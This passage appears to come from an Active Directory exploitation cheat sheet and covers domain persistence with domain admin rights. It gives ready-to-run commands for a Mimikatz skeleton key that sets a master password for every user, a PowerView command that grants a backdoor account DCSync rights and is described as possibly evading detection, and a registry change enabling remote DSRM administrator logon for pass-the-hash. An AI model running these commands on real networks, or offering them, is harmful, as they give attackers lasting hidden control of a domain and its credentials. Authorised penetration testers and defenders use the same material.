_**Must be run with DA privileges.**_

### Mimikatz skeleton key attack

Run from DC. Enables password “mimikatz” for all users.

```plaintext
privilege::debug
misc::skeleton
```
### Grant specific user DCSync rights with PowerView

Gives a user of your choosing the rights to DCSync at any time. May evade detection in some setups.

```powershell
Add-ObjectACL -TargetDistinguishedName "dc=targetdomain,dc=com" -PrincipalSamAccountName BackdoorUser -Rights DCSync
```
### Domain Controller DSRM admin

The DSRM admin is the local administrator account of the DC. Remote logon needs to be enabled first.

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
Now we can login remotely using the local admin hash dumped on the DC before (with `lsadump::sam`, see [‘Dumping secrets with Mimikatz’](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#dumping-secrets-with-mimikatz) below). Use e.g. ‘overpass-the-hash’ to get a session (see [‘Mimikatz’](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#mimikatz) above).